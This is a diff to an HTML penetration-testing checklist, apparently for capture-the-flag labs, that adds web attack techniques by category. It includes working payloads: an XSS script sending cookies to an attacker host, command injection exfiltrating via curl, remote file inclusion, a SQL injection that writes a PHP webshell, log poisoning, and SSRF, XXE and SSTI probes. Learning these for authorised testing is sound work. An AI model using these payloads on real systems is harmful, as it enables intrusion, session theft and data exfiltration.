@@ -200,24 +200,108 @@
         <li><input type="checkbox"><label>Add all found vhosts to <code>/etc/hosts</code> and enumerate each separately</label></li>
         <li><input type="checkbox"><label>DNS zone transfer: <code>dig axfr @&lt;IP&gt; domain.htb</code></label></li>
       </ul>
-      <div class="subsection-label">Web Vulnerabilities</div>
+      <!-- ══ FRONTEND VULNS ══ -->
+      <div class="subsection-label">🖥️ Frontend Vulnerabilities</div>
       <ul class="checklist">
-        <li><input type="checkbox"><label><strong>IDOR:</strong> Test numeric/token params with 0, 1, 2... — <code>?token=0</code> or <code>?id=0</code> often returns all records</label></li>
-        <li><input type="checkbox"><label><strong>IDOR:</strong> Extract and crack any leaked MD5/weak hashes via hashcat: <code>hashcat -m 0 hashes.txt rockyou.txt</code></label></li>
-        <li><input type="checkbox"><label><strong>IDOR:</strong> Try IDOR on user profiles, files, orders — change ID in URL/body/cookie</label></li>
-        <li><input type="checkbox"><label><strong>SQLi:</strong> Test all inputs with <code>'</code>, <code>"</code>, <code>1=1</code>, sqlmap: <code>sqlmap -u &lt;URL&gt; --level=3 --risk=2</code></label></li>
-        <li><input type="checkbox"><label><strong>LFI/RFI:</strong> Test file params: <code>?page=../../../../etc/passwd</code>, <code>?file=php://filter/convert.base64-encode/resource=index.php</code></label></li>
-        <li><input type="checkbox"><label><strong>LFI log poisoning:</strong> If Apache/Nginx logs readable via LFI, inject PHP into User-Agent then include log file</label></li>
-        <li><input type="checkbox"><label><strong>SSRF:</strong> Test URL params for SSRF: <code>?url=http://127.0.0.1:&lt;port&gt;</code> — scan internal services</label></li>
-        <li><input type="checkbox"><label><strong>Command injection:</strong> Test all input fields: <code>; id</code>, <code>| id</code>, <code>\`id\`</code>, <code>$(id)</code></label></li>
-        <li><input type="checkbox"><label><strong>File upload:</strong> Try bypass — change content-type, double extension (.php.jpg), null byte, magic bytes</label></li>
-        <li><input type="checkbox"><label><strong>Credential spraying:</strong> Derive usernames from extracted full names (firstname, firstnamelastname, f.lastname, etc.)</label></li>
-        <li><input type="checkbox"><label>Run Nikto: <code>nikto -h &lt;URL&gt;</code></label></li>
-        <li><input type="checkbox"><label>Run Burp Suite — intercept all requests, check for interesting parameters in all responses</label></li>
-        <li><input type="checkbox"><label>Check for password reset flaws (token brute force, host header injection in reset email)</label></li>
-        <li><input type="checkbox"><label>Check "forgot password" endpoint for user enumeration via response differences</label></li>
+        <li><input type="checkbox"><label><strong>Sensitive Data Exposure:</strong> Always view page source — look for credentials, API keys, internal paths, commented-out code, hidden form fields</label></li>
+        <li><input type="checkbox"><label><strong>Sensitive Data Exposure:</strong> Check JS files for secrets: <code>grep -r "api_key\|password\|secret\|token" *.js</code> or use browser DevTools → Sources</label></li>
+        <li><input type="checkbox"><label><strong>HTML Injection:</strong> Input not sanitized? Inject <code>&lt;h1&gt;Injected&lt;/h1&gt;</code> — if rendered, escalate to XSS or phishing payload</label></li>
+        <li><input type="checkbox"><label><strong>XSS (Reflected):</strong> Test all input/URL params: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, <code>&lt;img src=x onerror=alert(1)&gt;</code>, <code>"&gt;&lt;svg onload=alert(1)&gt;</code></label></li>
+        <li><input type="checkbox"><label><strong>XSS (Stored):</strong> Inject XSS in persistent fields (username, comments, profile bio) — fires for every user who loads the page</label></li>
+        <li><input type="checkbox"><label><strong>XSS (DOM-based):</strong> Check if JS uses <code>document.write</code>, <code>innerHTML</code>, <code>eval()</code> with user-controlled input</label></li>
+        <li><input type="checkbox"><label><strong>XSS cookie theft:</strong> <code>&lt;script&gt;document.location='http://&lt;attacker&gt;/?c='+document.cookie&lt;/script&gt;</code> — steal admin session</label></li>
+        <li><input type="checkbox"><label><strong>CSRF:</strong> Check if state-changing requests use CSRF tokens — if not, craft a forged form that auto-submits from attacker's page</label></li>
+        <li><input type="checkbox"><label><strong>CSRF:</strong> Test token absence, token reuse, token not tied to session, GET-based state changes</label></li>
+        <li><input type="checkbox"><label><strong>CSRF bypass:</strong> Try removing token, changing method to GET, or using same-site requests if cookie SameSite is not Strict</label></li>
       </ul>
-      <div class="subsection-label">CMS Specific</div>
+
+      <!-- ══ BACKEND / INJECTION VULNS ══ -->
+      <div class="subsection-label">⚙️ Backend / Injection Vulnerabilities</div>
+      <ul class="checklist">
+        <li><input type="checkbox"><label><strong>SQL Injection (detection):</strong> Add <code>'</code> to every input — SQL error = injectable. Try: <code>' OR '1'='1</code>, <code>' OR 1=1--</code>, <code>admin'--</code></label></li>
+        <li><input type="checkbox"><label><strong>SQLi (UNION-based):</strong> Find column count: <code>' ORDER BY 1--</code> increment until error, then <code>' UNION SELECT 1,2,3--</code></label></li>
+        <li><input type="checkbox"><label><strong>SQLi (blind boolean):</strong> <code>' AND 1=1--</code> (true) vs <code>' AND 1=2--</code> (false) — different responses confirm blind SQLi</label></li>
+        <li><input type="checkbox"><label><strong>SQLi (time-based):</strong> <code>'; WAITFOR DELAY '0:0:5'--</code> (MSSQL) / <code>' AND SLEEP(5)--</code> (MySQL) — delay confirms blind SQLi</label></li>
+        <li><input type="checkbox"><label><strong>SQLi (file read):</strong> <code>' UNION SELECT LOAD_FILE('/etc/passwd')--</code> (MySQL if FILE priv)</label></li>
+        <li><input type="checkbox"><label><strong>SQLi (webshell write):</strong> <code>' UNION SELECT '&lt;?php system($_GET["cmd"]);?&gt;' INTO OUTFILE '/var/www/html/shell.php'--</code></label></li>
+        <li><input type="checkbox"><label><strong>SQLi automation:</strong> <code>sqlmap -u "&lt;URL&gt;?id=1" --dbs --batch</code>, then <code>--dump -D &lt;db&gt; -T users</code></label></li>
+        <li><input type="checkbox"><label><strong>Broken Auth:</strong> Try default creds (admin:admin, admin:password, admin:123456), brute force with hydra</label></li>
+        <li><input type="checkbox"><label><strong>Broken Auth:</strong> Check if session tokens are predictable, short, or base64-encoded without signing</label></li>
+        <li><input type="checkbox"><label><strong>Broken Auth:</strong> Test password reset: brute-force reset tokens, check if token is in URL (leaks in Referer header)</label></li>
+        <li><input type="checkbox"><label><strong>Command Injection:</strong> Test all inputs that might pass to OS: <code>; id</code>, <code>| id</code>, <code>&amp;&amp; id</code>, <code>$(id)</code>, <code>`id`</code></label></li>
+        <li><input type="checkbox"><label><strong>Command Injection (blind):</strong> <code>; ping -c 1 &lt;attacker&gt;</code> — watch tcpdump for ICMP or use <code>; curl http://&lt;attacker&gt;/$(id)</code></label></li>
+        <li><input type="checkbox"><label><strong>Command Injection bypass:</strong> Try <code>{id}</code>, <code>%0aid</code>, newline injection, or encoding if filters are present</label></li>
+      </ul>
+
+      <!-- ══ FILE ATTACKS ══ -->
+      <div class="subsection-label">📁 File Inclusion & Upload Attacks</div>
+      <ul class="checklist">
+        <li><input type="checkbox"><label><strong>LFI (basic):</strong> <code>?page=../../../../etc/passwd</code>, <code>?file=../../../etc/shadow</code> — test any param that loads content</label></li>
+        <li><input type="checkbox"><label><strong>LFI (PHP wrapper):</strong> <code>?page=php://filter/convert.base64-encode/resource=index.php</code> — read PHP source without executing it</label></li>
+        <li><input type="checkbox"><label><strong>LFI (input stream):</strong> <code>?page=php://input</code> with POST body <code>&lt;?php system('id');?&gt;</code></label></li>
+        <li><input type="checkbox"><label><strong>LFI (zip/phar):</strong> Upload zip with PHP shell, include via <code>?page=phar://upload/shell.zip/shell.php</code></label></li>
+        <li><input type="checkbox"><label><strong>LFI log poisoning:</strong> Poison SSH log: <code>ssh '&lt;?php system($_GET["cmd"]);?&gt;'@&lt;IP&gt;</code> then LFI to <code>/var/log/auth.log</code></label></li>
+        <li><input type="checkbox"><label><strong>LFI log poisoning (Apache):</strong> Inject PHP in User-Agent via Burp, then include <code>/var/log/apache2/access.log</code></label></li>
+        <li><input type="checkbox"><label><strong>RFI:</strong> <code>?page=http://&lt;attacker&gt;/shell.php</code> — only works if <code>allow_url_include=On</code> in PHP config</label></li>
+        <li><input type="checkbox"><label><strong>File Upload (bypass content-type):</strong> Change <code>Content-Type: image/jpeg</code> on a .php file in Burp Repeater</label></li>
+        <li><input type="checkbox"><label><strong>File Upload (double extension):</strong> Upload <code>shell.php.jpg</code> — server may execute if misconfigured</label></li>
+        <li><input type="checkbox"><label><strong>File Upload (magic bytes):</strong> Prepend <code>GIF89a;</code> or JPEG header bytes to PHP payload to pass file type checks</label></li>
+        <li><input type="checkbox"><label><strong>File Upload (null byte):</strong> <code>shell.php%00.jpg</code> — older PHP versions truncate at null byte</label></li>
+        <li><input type="checkbox"><label><strong>File Upload (Apache .htaccess):</strong> Upload <code>.htaccess</code> with <code>AddType application/x-httpd-php .jpg</code> then upload .jpg webshell</label></li>
+        <li><input type="checkbox"><label><strong>File Upload (find upload dir):</strong> Fuzz for upload path, check source code or error messages, try predictable paths like <code>/uploads/</code>, <code>/files/</code></label></li>
+      </ul>
+
+      <!-- ══ ACCESS CONTROL ══ -->
+      <div class="subsection-label">🔐 Broken Access Control & IDOR</div>
+      <ul class="checklist">
+        <li><input type="checkbox"><label><strong>IDOR (numeric IDs):</strong> Change <code>?id=5</code> → <code>?id=1</code>, <code>?id=0</code>, <code>?id=-1</code> — access other users' data</label></li>
+        <li><input type="checkbox"><label><strong>IDOR (token params):</strong> Try <code>?token=0</code> or brute-force token values — often returns full user database</label></li>
+        <li><input type="checkbox"><label><strong>IDOR (hash-based):</strong> If ID is MD5/SHA1 of predictable value, compute the hash yourself: <code>echo -n "1" | md5sum</code></label></li>
+        <li><input type="checkbox"><label><strong>IDOR (crack leaked hashes):</strong> <code>hashcat -m 0 hashes.txt rockyou.txt</code> for MD5, <code>-m 100</code> for SHA1</label></li>
+        <li><input type="checkbox"><label><strong>IDOR (body/cookie):</strong> Also check POST body, JSON payloads, and cookies — not just URL parameters</label></li>
+        <li><input type="checkbox"><label><strong>Broken Access Control:</strong> Try accessing admin endpoints directly: <code>/admin</code>, <code>/admin/users</code>, <code>/api/admin</code></label></li>
+        <li><input type="checkbox"><label><strong>Broken Access Control:</strong> Access as low-priv user, then replay requests replacing low-priv user's cookie with no cookie, or different role</label></li>
+        <li><input type="checkbox"><label><strong>Broken Access Control:</strong> Try horizontal privilege escalation — access another user's profile/data at same privilege level</label></li>
+        <li><input type="checkbox"><label><strong>JWT attacks:</strong> Decode JWT (jwt.io), try alg:none, change role claim and re-sign, check for weak HMAC secret with hashcat</label></li>
+        <li><input type="checkbox"><label><strong>Mass assignment:</strong> Add extra fields to JSON body (e.g. <code>"role":"admin"</code>, <code>"is_admin":true</code>) — framework may bind them automatically</label></li>
+      </ul>
+
+      <!-- ══ OWASP TOP 10 ══ -->
+      <div class="subsection-label">🛡️ OWASP Top 10 — Full Coverage</div>
+      <ul class="checklist">
+        <li><input type="checkbox"><label><strong>A01 Broken Access Control:</strong> Test IDOR, admin endpoint access, JWT tampering, missing function-level access control (see above)</label></li>
+        <li><input type="checkbox"><label><strong>A02 Cryptographic Failures:</strong> HTTP instead of HTTPS? Weak cipher suites? Sensitive data in URL? Weak hash (MD5/SHA1) for passwords? Hardcoded keys?</label></li>
+        <li><input type="checkbox"><label><strong>A02 Cryptographic Failures:</strong> Check SSL/TLS config: <code>testssl.sh &lt;domain&gt;</code> or <code>sslscan &lt;domain&gt;</code></label></li>
+        <li><input type="checkbox"><label><strong>A03 Injection:</strong> SQLi, command injection, LDAP injection (<code>*)(uid=*))(|(uid=*</code>), XPath injection, template injection</label></li>
+        <li><input type="checkbox"><label><strong>A03 SSTI:</strong> Test template engines: <code>{{7*7}}</code> → 49? Jinja2/Twig. Try: <code>{{config}}</code>, <code>{{''.__class__.__mro__[1].__subclasses__()}}</code></label></li>
+        <li><input type="checkbox"><label><strong>A04 Insecure Design:</strong> Business logic flaws — skip payment step, negative quantities, apply coupons multiple times, access locked features</label></li>
+        <li><input type="checkbox"><label><strong>A04 Insecure Design:</strong> Race conditions — send concurrent requests to claim reward/coupon twice (use Burp Turbo Intruder)</label></li>
+        <li><input type="checkbox"><label><strong>A05 Security Misconfiguration:</strong> Default creds, unnecessary features enabled, error messages with stack traces, directory listing, open CORS</label></li>
+        <li><input type="checkbox"><label><strong>A05 Security Misconfiguration:</strong> Check CORS: <code>Origin: https://evil.com</code> — if reflected in response, exploit with malicious page reading API responses</label></li>
+        <li><input type="checkbox"><label><strong>A06 Vulnerable Components:</strong> Fingerprint all versions (app, frameworks, libraries) → searchsploit, CVEdetails, Snyk</label></li>
+        <li><input type="checkbox"><label><strong>A07 Auth Failures:</strong> Weak password policy, no lockout, exposed session in URL, session not invalidated on logout, username enumeration</label></li>
+        <li><input type="checkbox"><label><strong>A08 Software Integrity Failures:</strong> Unsigned updates, CDN resources without SRI hashes, deserialization of untrusted data</label></li>
+        <li><input type="checkbox"><label><strong>A08 Insecure Deserialization:</strong> If cookies/params are serialized objects (PHP serialize, Java base64 obj, Python pickle) — try ysoserial/phpggc</label></li>
+        <li><input type="checkbox"><label><strong>A09 Logging Failures:</strong> Can you trigger events without any alerting? Failed logins not logged? Useful for assessing detection capability in report</label></li>
+        <li><input type="checkbox"><label><strong>A10 SSRF:</strong> <code>?url=http://127.0.0.1/</code>, <code>?img=http://169.254.169.254/latest/meta-data/</code> (AWS metadata), <code>file:///etc/passwd</code></label></li>
+        <li><input type="checkbox"><label><strong>A10 SSRF bypass:</strong> Try <code>http://[::1]/</code>, <code>http://0.0.0.0/</code>, <code>http://0177.0.0.1/</code>, <code>http://localhost.attacker.com/</code>, URL redirect chains</label></li>
+      </ul>
+
+      <!-- ══ MISC WEB ══ -->
+      <div class="subsection-label">🔧 Misc Web Checks</div>
+      <ul class="checklist">
+        <li><input type="checkbox"><label>Run Nikto: <code>nikto -h &lt;URL&gt;</code></label></li>
+        <li><input type="checkbox"><label>Run Burp Suite — intercept all requests, check every parameter in every response</label></li>
+        <li><input type="checkbox"><label><strong>Credential spraying:</strong> Derive usernames from full names found (firstname, f.lastname, firstnamelastname, etc.)</label></li>
+        <li><input type="checkbox"><label>Check password reset — brute-force token, host header injection, token leaks in Referer</label></li>
+        <li><input type="checkbox"><label>Check "forgot password" for user enumeration via response time or content differences</label></li>
+        <li><input type="checkbox"><label>Open redirect: <code>?redirect=https://evil.com</code> — can be used for phishing or OAuth token theft</label></li>
+        <li><input type="checkbox"><label>XXE (XML input): replace entity with <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</code></label></li>
+        <li><input type="checkbox"><label>GraphQL: introspection query to dump schema, check for missing auth on mutations, IDOR via node IDs</label></li>
+      </ul>
+
+      <!-- ══ CMS ══ -->
+      <div class="subsection-label">🖧 CMS Specific</div>
       <ul class="checklist">
         <li><input type="checkbox"><label><strong>WordPress:</strong> <code>wpscan --url &lt;URL&gt; --enumerate u,p,t,vp,vt --api-token &lt;token&gt;</code></label></li>
         <li><input type="checkbox"><label><strong>Cacti:</strong> Check version in footer — Cacti &lt;= 1.2.28 vulnerable to CVE-2025-24367 (Auth RCE via graph template)</label></li>
